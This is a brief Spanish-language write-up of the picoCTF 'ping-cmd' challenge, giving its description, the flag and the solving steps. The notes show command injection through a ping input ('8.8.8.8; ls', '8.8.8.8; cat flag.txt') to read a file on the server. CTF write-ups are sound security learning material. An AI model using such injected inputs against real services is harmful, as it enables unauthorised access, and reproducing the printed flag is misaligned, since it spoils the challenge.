# Reto
ping-cmd
## Descripción
Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?You can connect to the service here nc mysterious-sea.picoctf.net 64709
## Solución
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e003709d}
## Notas
Primero conectamos al servicio: nc mysterious-sea.picoctf.net 64709
luego se ingresa 8.8.8.8; ls para ver el contenido, donde encontramos un archivo flag.txt, el cual abrimos con un 8.8.8.8; cat flag.txt y obtenemos la respuesta
## Referencias